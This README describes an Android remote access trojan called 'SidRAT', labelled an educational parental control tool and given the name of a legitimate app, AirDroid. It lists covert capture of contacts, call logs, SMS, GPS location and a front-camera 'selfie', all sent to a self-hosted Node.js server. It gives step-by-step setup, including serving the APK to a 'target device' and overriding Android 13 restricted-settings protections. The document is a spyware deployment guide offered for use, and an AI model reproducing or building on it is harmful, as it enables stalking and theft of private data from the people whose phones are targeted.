# AirDroid: Educational Parental Control & Data Sync Tool aka SidRAT 

---

## 🚀 Features

* **Modern UI:** Clean, Material Design 3 login and registration interface.
* **Full Data Sync:** Automatically captures and transmits:
    * **Contacts:** Full name and phone number lists.
    * **Call Logs:** Comprehensive history of incoming/outgoing calls.
    * **SMS:** Incoming messages from the device inbox.
    * **GPS:** Precise latitude and longitude coordinates.
* **Security Capture:** Utilizes the front-facing camera for a "security selfie" during synchronization.
* **Robust Backend:** Node.js server with ASCII-themed console and automatic dated file logging.

---

## 📂 Project Structure


my-server/
├── node_modules/         # Node.js dependencies
├── AirDroid icon.png     # Custom app branding
├── app-debug.apk         # Compiled Android binary
├── server.js             # Node.js logic and API
├── package.json          # Project metadata
└── Data_YYYY-MM-DD.txt   # Captured data logs (Generated)

---

## 🛠️ Setup Instructions

1. Backend Configuration (PC)
Install Node.js: Download the latest LTS version.

Setup Server:
npm install express
node server.js

---

Find Local IP: Run ipconfig (Windows) or ifconfig (Mac/Linux) to find your IPv4 address.

2. Android App Configuration (Android Studio)
Permissions: Verify AndroidManifest.xml includes all tags for SMS, Contacts, Camera, and Location.

Update IP: Set the SERVER_URL in MainActivity.kt to your PC's IPv4 address.

Build APK: Navigate to Build > Build APK(s) to generate the file.

3. Installation
Download: On the target device, visit http://<YOUR_IP>:3000/download/app-debug.apk.

Permissions (Android 13+):

Go to Settings > Apps > AirDroid.

Tap the 3 dots (top-right) -> Allow Restricted Settings.

Manually enable all permissions in the App Info menu.

---

## 📊 Data Logs
Once a sync is triggered, the server generates:

Data_[Timestamp].txt: JSON logs of all text data and GPS coordinates.

Selfie_[Timestamp].jpg: The captured image from the front camera.
